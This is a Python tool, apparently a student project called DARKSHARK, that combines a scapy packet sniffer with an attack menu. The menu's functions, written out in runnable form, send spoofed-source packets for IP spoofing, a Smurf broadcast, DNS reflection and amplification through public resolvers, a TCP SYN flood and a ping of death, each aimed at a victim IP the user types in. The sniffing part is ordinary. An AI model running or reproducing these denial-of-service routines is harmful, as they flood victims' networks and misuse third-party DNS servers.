#Group- Parth,Gaurav,Manas
#!/usr/bin/env python3

#imports
from scapy.all import *
from scapy.layers.http import *
import subprocess
import os
import glob
import sys
import re
import ipaddress

#class for new interface
class newInterface:
	def __init__(self,name,ip,mac):
		self.name = name
		self.ip = ip
		self.mac = mac
	
	#print interface
	def print_interface(self):   
		print("Name: " + self.name)
		print("IP Address: " + self.ip)
		print("MAC Address: " + self.mac)

#general class for interfaces
class Interface:
	def __init__(self):
		self.dface = conf.iface	  #default interface
		self.interfaces = []
		x = get_if_list()     #getting available interfaces information
		if(len(x)==0):
			print("No interface detected!")
			sys.exit(0)
		for i in x:
			interface = newInterface(i,get_if_addr(i),get_if_hwaddr(i))
			self.interfaces.append(interface)	
	#get default interface
	def default_interface(self): 
		return self.dface
	
	#to verify interface given by user.. return 1 if valid else 0
	def validate_interface(self,name):
		if(name==""):
			return 1
		flag = 0
		for i in self.interfaces:
			if(i.name == name):
				flag = 1
				break
		if(flag==0):
			return 0
		else:
			return 1
	# pretty print interfaces
	def print_interfaces(self):
		print("The Interfaces detected on the device are:")
		print()
		for c,i in enumerate(self.interfaces):
			if(self.dface == i.name):
				print("Interface " + str(c) + " (Default Interface) :-")
			else:
				print("Interface " + str(c) + " :-")
			print("--------------------------------------")
			i.print_interface()
			print()

#Function to validate a BPF, returns 1 if valid else 0
def validate_filter(filter):
	p = subprocess.Popen(['tcpdump','-i',interfaces.default_interface(),'-d',filter], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout, stderr = p.communicate()
	if stderr:return 0
	else:return 1

#Validation of input ip address
def validate_ip(ip):
	try:
		ipaddress.ip_address(ip)
		return True
	except ValueError:
		return False

#public dns nameservers list
def get_nameserver():
	ns = '''Select DNS nameserver to continue. Available nameservers are:- 
	1. Google Public DNS
	2. Cloudflare
	3. Comodo Secure DNS
	4. OpenDNS
	5. Quad9
	6. Verisign DNS'''
	print(ns)
	ch=0
	while True:  #get user input and validate
		a = input("Enter Sr No. of your choice: ")
		if(a == "1" or a == "2" or a == "3" or a == "4" or a == "5" or a=="6"):
			ch = int(a)
			break
		else:
			print("Invalid input! Please enter a valid one...")
	if(ch==1):
		return '8.8.8.8'
	elif(ch==2):
		return '1.1.1.1'
	elif(ch==4):
		return '208.67.222.222'
	elif(ch==5):
		return '9.9.9.9'
	elif(ch==6):
		return '64.6.64.6'
	else:  #comodo server best response
		return '8.26.56.26'
		
#Return a valid count for packets to be sent, either a positive input or default value
def get_packetCount_send():
	num = input("Please enter the number of packets to be sent(default is 5): ")
	while num and int(num)<0:
		num = input("Please enter a valid count for packets! (Default is 5): ")
	return int(num) if num else 5
	
#Return a valid count for packets to be captured, either a positive input or default value
def get_packetCount_capture():
	num = input("Please enter the number of packets to be captured(default is 5): ")
	while num and int(num)<0:
		num = input("Please enter a valid count for packets! (Default is 5): ")
	return int(num) if num else 5

#print introduction
def print_intro():
	os.system('clear')
	for i in range (130):
		print("-",end = "")
	logo = '''
	\t\t\t\t ___   _   ___ _  _____ _  _   _   ___ _  __
	\t\t\t\t|   \ /_\ | _ \ |/ / __| || | /_\ | _ \ |/ /
	\t\t\t\t| |) / _ \|   / ' <\__ \ __ |/ _ \|   / ' < 
	\t\t\t\t|___/_/ \_\_|_\_|\_\___/_||_/_/ \_\_|_\_|\_|
	\t\t\t\t\t\t\t\t\t     (v2.0)'''
                                            
	print(logo)
	for i in range (130):
		print("-", end = "")
	print("\n\nGet ready to dive in the world of hacking with your new buddy DARKSHARK.")
	print("Developed with \N{blue heart} by the three comrades:")
	print("\t-> Parth Thakker")
	print("\t-> Gaurav Bansal")
	print("\t-> Manas Ghai")
	print("\nSpecifications:-")
	print("------------------")
	print("\t-> Automatically Detect available network interfaces on the device with their IP and MAC addresses.")
	print("\t-> Shows all the TCP/IP headers of captured packets.")
	print("\t-> Supports a bunch of Berkley Packet Filters (BPFs) for smooth experience.")
	print("\t-> Comes with Regular Expression matching and Keyword searching during sniffing.")
	print("\t-> Supports logging of the sniffing summary.")
	print("What's New:-")
	print("-------------")
	print("\t-> Comes with powerful packet crafting ability to launch attacks.")
	print("\t-> Supports IP spoofing, IP Smurf attack, DNS Reflection, DNS Amplification, TCP SYN flooding attack, Ping of Death.")
	for i in range (130):
		print("-", end = "")
	print("\n")
	
#print menu of available functionalities
def print_menu():
	menu = '''Select one of the following to continue :-
	1. List available interfaces
	2. List available BPFs
	3. Start packet sniffing
	4. Time for revenge(Launch Attacks) \N{smiling face with horns}
	5. Exit'''
	print(menu)

#option 1 of menu, listing available interfaces
def list_interfaces():
	interfaces.print_interfaces()
	
#option 2 of menu, giving a small tutorial on BPF's
def list_bpf():
	bpflist = '''Note: Berkeley Packet Filters are in lowercase.
	Some examples of BPF's are:
	1. To restrict to a particular protocol, just type in that protocol:
	Example:
	tcp
	icmp
	2. You can also filter out properties of that protocol, say the port number or the source/destination IP:
	Examples:
	tcp port 80 (to and fro port 80, HTTP)
	ip host 192.168.1.1 (host ip should be 192.168.1.1)
	tcp dst port 80(to port 80, HTTP)
	3. You can also combine multiple BPF's using 'and':
	Examples:
	icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply (basically means no ping packets)
	To know more about BPF syntax, visit this webpage:
	'https://biot.com/capstats/bpf.html'
	'''
	print(bpflist)

#pretty print packet
def print_packet(packet):
	global counter
	print("Packet " + str(counter) + ":-")
	print("-"*15)
	packet.show()
	counter += 1

#option 3 of menu, capturing and sniffing packets
def capture_packets(filecounter):
	print("Starting Packet Sniffing: ")
	print("--------------------------------------")
	#reset packet print counter
	global counter
	counter = 1
	#Get the packetnumber to capture
	packetNumber = get_packetCount_capture()
		
	#Get the interface
	interface = ""
	while True:   	#get interface and validate
		interface = input("Enter the interface (leave blank for {}): ".format(interfaces.default_interface()))
		if(interfaces.validate_interface(interface) == 1):
			break
		else:
			print("Given Interface not found.. Wrong input! Enter again..")			   		
	actual_interface = interfaces.default_interface() if not interface else interface  
	
	#Get the BPF
	bpf = ""
	while True:
		bpf = input("Enter BPF (leave blank if none): ")
		if not bpf:
			break
		else:
			if validate_filter(bpf):break
			else:print("Invalid filter! Please enter a valid one.")

	#Get the regex to match in packet
	keyword = input("Enter a keyword/regex to be searched in the raw data (leave blank if none): ")
    
	print("\nPackets captured and the data is: (timeout is 20 seconds)")
	p = sniff(count = packetNumber, iface = actual_interface, filter = bpf, prn = print_packet, lfilter = lambda x: re.search(keyword,str(x)), timeout = 20)

	#If packets are captured, print and store them
	if p:
		#folder for storing packet captures
		foldername = "captures/"
		
		#check if files exist in that folder
		list_of_files = glob.glob(foldername+"*")
		if list_of_files:
			latest_file = max(list_of_files, key=os.path.getctime)
			temp = latest_file[-6]

			#If there's a digit at that position, its most probably our file, so update the counter.
			if temp.isdigit():filecounter=int(temp)+1
			#Else remove all captures, start afresh, since there maybe a garbage file there.
			else:
				for f in list_of_files:
					os.remove(f)

		print("Summary of the packets captured:")
		print("-"*40)
		p.nsummary()
		print()

		#Write the sniffed packets to the file
		filename = "packet_capture_" + str(filecounter) +".pcap"
		writer=PcapWriter(foldername+filename)
		writer.write(p)
		writer.flush()
		print("The packets captured are saved to {} in the captures folder.".format(filename))
		filecounter+=1

	#If no packets are captured in the timeout interval, print appropriate message.
	else:
	    if not bpf and not keyword:print("Timeout reached, no packets sniffed.")
	    else:print("Timeout seconds reached, no packets sniffed corresponding to the keyword/filter.")
	 
	return filecounter

#ip spoof attack
def ip_spoofing():
	print("\t\t IP Spoofing \N{ghost}")
	print("-"*60)
	
	source_ip = input("Please enter the source IP address: ")
	#while not validate_ip(source_ip):
	#	source_ip = input("Invalid IP! Please enter a valid IP address..")

	dest_ip = input("Please enter the destination IP address: ")
	#while not validate_ip(dest_ip):
	#	dest_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	send( IP(src = source_ip, dst =dest_ip)/TCP()/"Spoofing You rn :)" , count = num_packets )
	print("\nIP Spoofing attack finished.")
	print("-"*60)

#ip smurf attack
def ip_smurf_attack():
	print("\t\t IP SMURF Attack \N{cyclone}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	send( IP(src = victim_ip, dst ='255.255.255.255')/TCP()/"Smurfing You rn :)" , count = num_packets )
	print("\nIP Smurfing attack finished.")
	print("-"*60)

#dns reflection attack
def dns_reflection_attack():
	print("\t\t DNS Reflection Attack \N{bomb}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")
	ns = get_nameserver()
	num_packets = get_packetCount_send()
	dns_ref = IP(src = victim_ip, dst = ns)/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "A"))

	send(dns_ref, count = num_packets)
	print("\nDNS Reflection attack concluded successfully.")
	print("-"*60)
	
#dns amplification attack, basically dns reflection with query type = 'ANY'
def dns_amplification_attack():
	print("\t\t DNS Amplification Attack \N{bomb}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")
	ns = get_nameserver()
	num_packets = get_packetCount_send()
	dns_amp = IP(src = victim_ip, dst = ns)/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "twitter.com", qtype = "ANY"))

	send(dns_amp, count = num_packets)
	print("\nDNS Amplification attack finished.")
	print("-"*60)
	
#TCP SYN flooding attack
def tcp_synflood_attack():
	print("\t\t TCP SYN Flooding Attack \N{water wave}")
	print("-"*60)
	#remaining code
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	syn_flood = IP(dst = victim_ip)/TCP(sport=RandShort(), dport= [80], seq=12345,ack=1000,window=1000,flags="S")/"Flooding you rn xD"

	send(syn_flood, count = num_packets)
	print("\nTCP SYN flood attack launched successfully.")
	print("-"*60)

#ping of death attack
def ping_of_death():
	print("\t\t Ping of Death \N{skull}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	send( fragment(IP(dst=victim_ip)/ICMP()/("Very big payload"*60000)) )
	print("\nPing of death carried out successfully.")
	print("-"*60)

#option 4 of menu: launch attacks
def launch_attacks():
	print("It's time to launch attacks \N{fire} Kick off by choosing one of the following:- ")
	print("1. IP Spoofing")
	print("2. IP Smurf Attack")
	print("3. DNS Reflection Attack")
	print("4. DNS Amplification Attack")
	print("5. TCP SYN Flooding Attack")
	print("6. Ping of Death")
	print("7. Exit")
	ch=0
	while True:  #get user input and validate
		a = input("Enter Sr No. of your choice: ")
		if(a == "1" or a == "2" or a == "3" or a == "4" or a == "5" or a=="6" or a=="7"):
			ch = int(a)
			break
		else:
			print("Invalid input! Please enter a valid one.")
	#Call function according to user choice
	if(ch == 1):
		os.system('clear')
		ip_spoofing()
	elif(ch == 2):
		os.system('clear')
		ip_smurf_attack()
	elif(ch==3):
		os.system('clear')
		dns_reflection_attack()
	elif(ch==4):
		os.system('clear')
		dns_amplification_attack()
	elif(ch==5):
		os.system('clear')
		tcp_synflood_attack()
	elif(ch==6):
		os.system('clear')
		ping_of_death()
	else:
		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")

#main function
print_intro() #print introduction on console
interfaces = Interface() #initialize interfaces
filecounter = 1	#initialise counter variable for file
counter = 1  #packet print counter

#If captures directory hasn't already been created, then create it.
if not os.path.exists("captures"):
	os.mkdir("captures")

#Main loop
while True: 
	print_menu() #display menu
	ch=0
	while True:  #get user input and validate
		a = input("Enter Sr No. of your choice: ")
		if(a == "1" or a == "2" or a == "3" or a == "4" or a == "5"):
			ch = int(a)
			break
		else:
			print("Invalid input! Please enter a valid one.")

	#Call function according to user choice
	if(ch == 1):
		os.system('clear')
		list_interfaces()
	elif(ch == 2):
		os.system('clear')
		list_bpf()
	elif(ch==3):
		os.system('clear')
		filecounter = capture_packets(filecounter)
	elif(ch==4):
		os.system('clear')
		launch_attacks()
	else:
		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")
			
	#Prompt for staying in the program
	to_continue = input("Do you want to stay? (y/n): ")
	if to_continue is not ("y" or "Y"):
		sys.exit("-"*130+"\n\t\t\tHope the DARKSHARK experience was smooth. Come back another time \N{shark}")

	os.system('clear')
